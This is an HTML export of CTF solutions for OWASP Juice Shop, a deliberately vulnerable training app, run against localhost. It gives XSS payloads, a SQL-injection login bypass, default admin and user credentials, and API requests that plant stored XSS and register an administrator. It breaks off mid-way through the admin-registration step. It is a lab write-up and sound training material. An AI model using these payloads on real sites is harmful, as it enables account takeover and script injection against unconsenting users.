@@ -1,0 +1,808 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>OWASP Juice Shop</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	opacity: 0.5;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif; }
+.mono { font-family: Nitti, 'Microsoft YaHei', '微软雅黑', monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, KaiTi, STKaiTi, '华文楷体', KaiTi_GB2312, '楷体_GB2312', serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, Nitti, 'Microsoft YaHei', '微软雅黑', monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="8c18db82-b18d-41ce-ba63-d2ecbf9e308c" class="page sans"><header><h1 class="page-title">OWASP Juice Shop</h1></header><div class="page-body"><p id="ad69cb50-bd90-4ddc-b859-22956a2689c4" class="">This is an CTF solutions for Latest Version of OWASP Juice Shop.</p><p id="30a35039-787e-4df7-b624-ca7965777172" class="">—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   </p><h1 id="32b4cc07-0238-4236-bbf3-485cb9f42d00" class="">LEVEL - 1 </h1><p id="b9560f0b-2c6d-448a-85d0-400c5b2cd446" class="">—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  </p><h2 id="14209cd2-1d7b-4b08-b204-9cd9e85baf25" class="">0 - (Score Board)</h2><p id="8be05f97-d50b-47cb-98b5-19e88ce5b3bc" class="">
+</p><p id="07f8531d-3347-4bc3-9a7d-161d902963e4" class="">
+</p><p id="3600aa1b-f754-47cc-8d21-28121914e168" class="">For this challenge you need to search all the paths to get score board here we will <mark class="highlight-orange"><strong>dirsearch</strong></mark><strong> </strong>to do this and got following with status code 200</p><ul id="29f0c429-1a7f-403a-a7c7-4488f7c25be3" class="toggle"><li><details open=""><summary>/.well-known/security.txt </summary></details></li></ul><ul id="82d80019-374b-4063-a725-74749eafe816" class="toggle"><li><details open=""><summary>/ftp</summary></details></li></ul><ul id="fd370a17-ae1b-49d3-9f4f-341ac5a7cb1d" class="toggle"><li><details open=""><summary>/robots.txt</summary></details></li></ul><p id="57ca19a3-c2d1-4088-ab37-e14713f6a711" class="">
+</p><h2 id="f18485a4-cdd0-40be-8d75-953a131c8ebe" class="">1 -  (Error Handling)</h2><p id="0750ee2c-2d9f-423a-b257-79c1b9156a0a" class="">There are always some location available in each website which require authentication to access</p><p id="100f415e-4226-4703-96ee-c291b00c125e" class="">the following endpoint occurred and error.</p><pre id="7e198a20-eb69-41f4-9807-f7e52cd03d92" class="code"><code>http://localhost:3000/profile</code></pre><p id="f2b5a75e-0d37-44dd-b497-487434a00c09" class="">
+</p><h2 id="812bd77e-1a97-4b4d-9b15-40a246fff543" class="">2 -  (Privacy Policy)</h2><p id="58a70820-3c47-4027-8950-fd0727dc730d" class="">Read our privacy policy</p><p id="35724411-8f50-4b26-a69c-6da8af6d2ca2" class="">this is always to recommend to read for security policy </p><ul id="4fb04b02-0e90-4b6f-8456-aa25921f8dc1" class="toggle"><li><details open=""><summary>Login into Application with valid credentials   </summary></details></li></ul><ul id="fda0778f-4dcd-4211-8231-95b13c544ecd" class="toggle"><li><details open=""><summary>Privacy &amp; Security &gt; Privacy Policy</summary></details></li></ul><p id="bd6ae9ab-d5ce-4043-8eec-7cbd627c1fc0" class="">
+</p><h2 id="7541667f-8b9e-4595-8feb-6a2e25c0581f" class="">3 - (Outdated Whitelist)</h2><p id="8cd83575-5cd9-4b86-98cf-adc579afb514" class="">
+</p><p id="9105b4dd-4371-49ed-a2ed-1dad135c40d1" class="">
+</p><h2 id="7b23ce97-ba2b-4515-9307-95ba41356f5d" class="">4 -  (Confidential Document) </h2><p id="4c5f71bf-bffe-480c-83a0-020b4478b18d" class="">Access a confidential Document</p><p id="4e2cd685-fa34-486c-81ee-a4d0633ece00" class="">use <mark class="highlight-orange"><strong>dirb</strong></mark> tool you will end up with a path /ftp</p><pre id="bc293aa6-906a-43f7-a693-bc54c0d9265a" class="code"><code>http://localhost:3000/ftp</code></pre><p id="fb692169-676b-4ffe-bc61-03ea92a8acd9" class="">Only .md and .pdf files are allowed!</p><p id="450e2b0a-3341-4d58-ace2-63b24b450c37" class="">
+</p><h2 id="de2ea337-e7e6-4d4b-bb22-127c2699233d" class="">5 -  (XSS Dom based)</h2><p id="913730be-1a54-41e3-b89e-e6af2be9a0d1" class="">got to search bar and enter below payload</p><pre id="e94ba210-5867-4ace-b564-f097b4fdbd39" class="code"><code>&lt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt;</code></pre><p id="eb867e51-661e-44ed-bce4-a4c38b97e4a0" class="">
+</p><h2 id="a6765519-a7bc-46e7-9adb-bcdfc6272ec8" class="">6 -  (XSS Reflected)</h2><p id="9f2a9aa6-83a6-44a2-9097-903e420d04d5" class="">Go to track orders option
+<div class="indented"><p id="87ef898c-7cf6-450c-a546-a212c97ac69a" class="">
+</p></div></p><pre id="59235fe6-cd58-4744-9eda-1df77c30e1b9" class="code"><code>&lt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt;</code></pre><p id="64808489-0678-4a83-a817-988e2148c82e" class="">
+</p><h2 id="4fa6962d-0c4d-4ad7-93ce-acd9ffb54e05" class="">7-  (Repetitive Registration)</h2><p id="7c267f65-0b28-41d9-9a0f-64673b6cde3b" class="">there is flaw in Registration</p><p id="8d155c60-2d2a-47b6-9ab0-aab22162c8e2" class="">Follow the DRY principle while registering a user</p><p id="8f91f89c-2839-4a52-a83a-4ef106756c03" class="">
+</p><ul id="4fbe84b7-ea10-4e89-b871-f83fe61a7579" class="toggle"><li><details open=""><summary>type password &amp; repeat password both &gt; correct </summary></details></li></ul><p id="4c755a6b-52c4-4b80-9faa-fc15ade05d73" class="">eg :- 1234,1234 (this will validate the second filed )</p><p id="ad82a2f8-99ac-4a85-92e6-fff2c45aad6a" class="">once validated change the real password and let be repeat password the same</p><p id="5392179c-f756-4b2a-b44e-20f32864e5a5" class="">eg - 12345,1234</p><p id="b931422c-02d0-4a2e-8c99-23cd8215efae" class="">if it accepts then this is flaw.</p><p id="c9a12d9c-6beb-49b7-becd-d9de718ca8d9" class="">
+</p><h2 id="4b7760fb-bc2f-411e-9889-caa48ade31c4" class="">8 -  (Zero-Stars) </h2><p id="bd8ded0d-117f-49ab-9b99-6c0d7aca33e4" class="">Give a devastating zero-star feedback to the store</p><p id="268c9923-0273-4395-86e8-36bf746fd0ee" class="">go to &gt; Costumer feedback</p><p id="42cf90b8-2f7e-4e22-ae80-18a5bee12292" class="">use &#x27;inspect element&#x27; on  the submit button.</p><p id="a0c53155-d00e-4732-9c4c-e771ec1ac756" class="">
+</p><pre id="7e952fab-edb7-4f35-ac41-8d813c6a2ae0" class="code"><code>make &gt; enabeld=&quot;true&quot;</code></pre><p id="579f8dc9-244f-4dbb-b5fa-d1f27a808118" class="">
+</p><p id="e8bba761-77d6-4361-9c07-4e35229fcb2e" class="">
+</p><p id="489865cc-60c8-43f7-a137-61b81e6d7c21" class="">—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   </p><h1 id="b9083514-1f0a-4b48-9afd-bd626e0218e3" class="">LEVEL -2   </h1><p id="ceee655f-0700-4ded-83eb-f029789231ca" class="">—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  </p><p id="85ab3309-225b-4c86-a40f-a9c89b8f371e" class="">
+</p><h2 id="9129c9f2-391b-4221-a64f-e4819d314a47" class="">1- Security Policy</h2><p id="f012d4c3-4a5a-4505-9899-c8f0e218d1e3" class="">Behave like any &quot;white-hat&quot; should before getting into the action.</p><p id="6f102b0f-6b5b-4f5a-9017-08312314e55c" class="">look for /.well-known/security.txt </p><p id="70753274-aee8-4920-a1e8-fd8bfeb9f93b" class="">
+</p><h2 id="1e6a8385-111e-40db-92dc-4420550b846e" class="">2 - Login Admin (Injection)</h2><p id="663dcfa6-d3cc-4532-8642-79ce05adb3c5" class="">Log in with the administrator&#x27;s user account.</p><p id="a3f42cdc-fd31-4c1b-8506-dd339e1b8bb5" class="">
+</p><pre id="3b345bd7-37d1-47e5-a167-17dedfabf6ba" class="code"><code>username - &#x27;1=1 --
+password - anypassword
+(this will give access to the first user i.e admin)</code></pre><p id="05303547-d513-459c-81ca-1a22b89f1dc6" class="">
+</p><h2 id="dc9c7a78-bc6e-4c8a-9fc8-cf7d378063c7" class="">3 - Admin Section (Broken Access Control)</h2><p id="d106ef58-c877-40eb-af79-73548b92dff0" class="">
+</p><p id="b9013487-7cd5-4560-8257-f7efc4b504bb" class="">once logged in with the help of injection in admin account visit following URL.</p><pre id="88235569-ad68-4b4b-a85f-467e5a4012f7" class="code"><code>http://localhost:3000/#/administration</code></pre><p id="bf4dcf28-e828-4631-b1b8-f6f564560446" class="">and here you get admin panel section access</p><h2 id="9009059f-885b-4e99-8962-3de30a3053a1" class="">4 - Five-Star Feedback (Broken Access Control)</h2><p id="1b00f94a-64b1-4f17-aa41-d65c6be5476a" class="">
+</p><p id="4ac23038-8019-42b4-b264-518ad32e8f85" class="">get into admin account and using the injection</p><p id="4e03b558-fa65-4d98-8823-4d62a0fe92c1" class="">once got access into admin account </p><p id="3047cc6e-386f-4cac-9b5b-4731b6bed8bd" class="">go to /administration section and here you get complete access to admin section to remove the all feedbacks of 5 stars.</p><p id="35d953bc-62b3-488e-b6bf-c9129aa2899f" class="">
+</p><h2 id="c7fc81d2-e93e-43e6-adef-6cbb90e34b04" class="">5 - View basket</h2><p id="6ae3b50b-f9c4-435b-854b-70e2cffb9eb1" class="">
+</p><p id="2a89b77e-579e-436c-bd0b-2c4091db5d21" class="">
+</p><h2 id="2997b895-98a6-4898-b96c-6510d97b5974" class="">6 - Deprecated Interface B2B</h2><p id="c51167f4-23e5-4a40-9c55-96c4aee685e0" class="">here you need to upload a file whose extension is not allowed</p><p id="c9a6aeff-3f3b-4570-81d5-b5647edae419" class="">we will check main.js here we get if search for pdf or zip </p><p id="4d650838-b5c7-4e5c-9f36-5cdfa1b9df18" class="">the result will be like &gt; there is one more file extension allowed</p><p id="f9fb2a8d-f1fe-4cfc-9a07-4b204904ed28" class="">eg:- upload xml file to solve this challenge and look for console we get 410 Gone  </p><p id="8264eede-50a1-4d0d-9d93-55edbd08d793" class="">
+</p><h2 id="b0b1fa5a-ba18-41ce-bde5-d9d637f5c95d" class="">7 - Password Strength</h2><p id="9250d353-5bc7-4b12-aa52-c3c70f444304" class="">Log in with the administrator&#x27;s user credentials without previously changing them or applying SQL Injection.</p><p id="4f073a98-411b-466c-a5fb-00c438f71a2a" class="">Do SQL injection you will get an hash for a password &gt; get original value using rainbow table,</p><p id="09ee58b5-c457-46a4-b360-2dab928f06d1" class="">else you can brute-force because password for admin is so easy</p><pre id="d0d69eeb-4d32-4501-87bd-2a8a2cfbc004" class="code"><code>admin123</code></pre><p id="2aeeda38-0489-47e6-882a-a52e7077fc6b" class="">
+</p><h2 id="5c4d0008-1c9f-4707-8ef3-72e727945a06" class="">8- Login MC SafeSearch</h2><p id="438e3a88-25ed-4023-ac05-ac58fa65f946" class="">(google MC SafeSearch) - listen to video you will get password</p><p id="11fa34ea-c4db-450c-b26a-335f29cf9a7a" class="">Log in with MC SafeSearch&#x27;s original user credentials without applying SQL Injection or any other bypass.</p><pre id="ee30bebf-217a-43c5-9dd3-d97af90f88f1" class="code"><code>username - mc.safesearch@juice-sh.op
+password - Mr. N00dles</code></pre><p id="1e0ded39-f2e5-472b-bbe3-76dc281cc141" class="">
+</p><h2 id="3cbfbe5b-76cc-4aa0-85c2-f2fdddc5a61d" class="">9 - Stored Simple XSS on username</h2><p id="4a72010f-3781-4513-ac6d-53696e108f71" class="">
+</p><ol id="09dd88b7-7e49-487b-8d0c-735c9596313e" class="numbered-list" start="1"><li>hange the username into <code>&lt;script&gt;alert(`xss`)&lt;/script&gt;</code> and click <em>Set Username</em>.</li></ol><ol id="cda1043e-dec8-45fd-832b-0c132854bc30" class="numbered-list" start="2"><li>Notice the displayed username under the profile picture now is <code>lert(`xss`)</code> while in the <em>Username</em> field it shows <code>lert(`xss`)&lt;/script&gt;</code> - both a clear indication that the malicious input was sanitized. Obviously the sanitization was not very sophisticated, as the input was quite mangled and even the closing <code>&lt;script&gt;</code> tag survived the procedure.</li></ol><ol id="ca79f880-1371-4efd-81d9-9af61ce3080b" class="numbered-list" start="3"><li>Change the username into <code>&lt;&lt;a|ascript&gt;alert(`xss`)&lt;/script&gt;</code> and click <em>Set Username</em>.</li></ol><ol id="78a3d9e4-20ec-4075-a00e-2ec3216f2601" class="numbered-list" start="4"><li>The naive sanitizer only removes <code>&lt;a|a</code> effectively changing the username into <code>&lt;script&gt;alert(`xss`)&lt;/script&gt;</code> thus resulting in the expected alert box popping up.</li></ol><ol id="f7e28ffb-124a-407a-aef6-b1e1883dad72" class="numbered-list" start="5"><li>use the following payload.</li></ol><pre id="7d239333-619f-464f-8eaf-f7f5c98e0eeb" class="code"><code>&lt;&lt;a|ascript&gt;alert(`xss`)&lt;/script&gt;</code></pre><p id="c7357444-81e1-4d1c-be69-14ec27f038c5" class="">
+</p><h2 id="efe5523a-912b-44f5-9eb9-d431d49f21a6" class="">10 - Weird Crypto </h2><p id="c5381991-70fc-4db7-a516-2779eaa7542c" class="">
+</p><p id="facb92a4-0f02-4875-aa43-89eba4ff03a8" class="">
+</p><p id="8f69d607-0b03-4f9e-a6c7-fd154c2f1961" class="">
+</p><p id="d999ddb5-902f-431f-a47d-2e6ee075ce30" class="">—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   </p><h1 id="2a5b091c-fd28-437f-869e-f6819470420c" class="">LEVEL -3   </h1><p id="a55318e4-3bb7-4c3b-a80d-354146e7d1c7" class="">—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  </p><p id="5b6466c4-c04f-4915-bbe6-fa676d032ff2" class="">
+</p><p id="a2252a98-f14d-42fa-ba6f-c234570e6999" class="">
+</p><h2 id="b20ac2a6-376b-44df-a02d-4690f1912f75" class="">1 - API-only XSS</h2><p id="41210412-67c7-40a5-95dd-36996d06731a" class="">(Perform a persisted XSS attack with &lt;iframe src=&quot;javascript:alert(<code>xss</code>)&quot;&gt; without using the frontend application at all.)</p><p id="0b5dac95-d507-43ec-9536-33e0f9da85e3" class="">
+</p><ol id="be142313-d098-4ac9-8b24-0dc0d0cc1747" class="numbered-list" start="1"><li>g in to the application with any user.</li></ol><ol id="be1faa3b-eff6-4e94-92dc-1bbfaead0868" class="numbered-list" start="2"><li>Copy your <code>Authorization</code> header from any HTTP request submitted via browser.</li></ol><ol id="b0145170-3569-4bf4-ae4e-322a0791aea7" class="numbered-list" start="3"><li>Submit a POST request to <a href="http://localhost:3000/api/Products">http://localhost:3000/api/Products</a> with<ul id="22b800e8-d997-4240-8e3d-46e272d81880" class="bulleted-list"><li><code>{&quot;name&quot;: &quot;XSS&quot;, &quot;description&quot;: &quot;&lt;iframe src=\&quot;javascript:alert(</code>xss<code>)\&quot;&gt;&quot;, &quot;price&quot;: 47.11}</code> as body,</li></ul><ul id="5db0f8e4-ba0c-4d8a-b786-f4b278043d88" class="bulleted-list"><li><code>application/json</code> as <code>Content-Type</code></li></ul><ul id="59c31139-2d40-4c17-9dde-322e84e5fce6" class="bulleted-list"><li>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with the token you copied from the browser.</li></ul></li></ol><h2 id="216fed47-a7b7-4297-b25b-0fb02f04bf41" class="">2 - Client-side XSS Protection</h2><p id="3277b76a-a00a-4b63-bf98-50ee8e7d9d65" class="">use POSTMAN tool</p><p id="2977b3ca-d128-4505-a4ff-b8a14294e279" class="">Perform a persisted XSS attack with &lt;iframe src=&quot;javascript:alert(`<code>xss</code>`)&quot;&gt; without using the frontend application at all.</p><p id="3c7451cb-205f-467c-b179-278adf3ed8c4" class="">Submit a POST request to <a href="http://localhost:3000/api/Users">http://localhost:3000/api/Users</a> with</p><ul id="c7ee0d82-ea5e-4b9a-be30-4211d2547ab1" class="bulleted-list"><li><code>{&quot;email&quot;: &quot;&lt;iframe src=\&quot;javascript:alert(</code>`xss`<code>)\&quot;&gt;&quot;, &quot;password&quot;: &quot;xss&quot;}</code> as body</li></ul><ul id="6ec35fad-47e6-408d-a167-5cc2f6574e0b" class="bulleted-list"><li>and <code>application/json</code> as <code>Content-Type</code> header.</li></ul><p id="93a76bde-86a4-4ade-91e4-e4e992a62710" class="">
+</p><ol id="8b10f5a3-678f-456c-9cb5-69e452ddb86f" class="numbered-list" start="1"><li>Log in to the application with any user.</li></ol><ol id="11c540d1-d623-4446-a5fb-09fa0beef486" class="numbered-list" start="2"><li>Visit <a href="http://localhost:3000/#/administration">http://localhost:3000/#/administration</a>.</li></ol><ol id="a7fa92a8-28e4-46f3-b6f2-41a4f410fd55" class="numbered-list" start="3"><li>An alert box with the text &quot;xss&quot; should appear.</li></ol><p id="127e6b47-b4e2-4e13-9d22-4650519018d1" class="">
+</p><h2 id="345aeb4b-76a2-4954-bea4-6b1fb62a5d6c" class="">3 - Admin Registration </h2><p id="c79de73d-b4e7-4725-9fc2-9b750457678a" class="">
+</p><p id="e3903ece-ed82-4f19-8cc9-322ed3b831b2" class="">Register as a user with administrator privileges.</p><p id="0b9fe67d-055b-4889-be99-16401c8d3c66" class="">when Registration the api send a post request as follows</p><p id="23467e9b-e3b5-456c-bf2b-c9a3febe4ece" class="">
+</p><p id="46802dc8-c4c6-4c3e-933b-73fc2b45faae" class="">Submit a POST request to <a href="http://localhost:3000/api/Users">http://localhost:3000/api/Users</a> with</p><p id="5d985b5d-e3b4-440e-82c1-ccb073fdb211" class="block-color-orange"><mark class="highlight-brown_background">{&quot;email&quot;:&quot;demo@demo.com&quot;,&quot;password&quot;:&quot;12345&quot;,&quot;passwordRepeat&quot;:&quot;12345&quot;,&quot;securityQuestion&quot;:{&quot;id&quot;:9,&quot;question&quot;:&quot;Your ZIP/postal code when you were a teenager?&quot;,&quot;createdAt&quot;:&quot;2019-10-13T06:02:00.790Z&quot;,&quot;updatedAt&quot;:&quot;2019-10-13T06:02:00.790Z&quot;},&quot;securityAnswer&quot;:&quot;431005&quot;}</mark></p><p id="72bfc994-be37-49a9-bf41-eaf15d627e73" class="">in response we get  <mark class="highlight-red"><strong>&quot;role&quot;:&quot;customer&quot;</strong></mark> </p><p id="0125e56d-da8e-4274-bedc-d976d1843dd1" 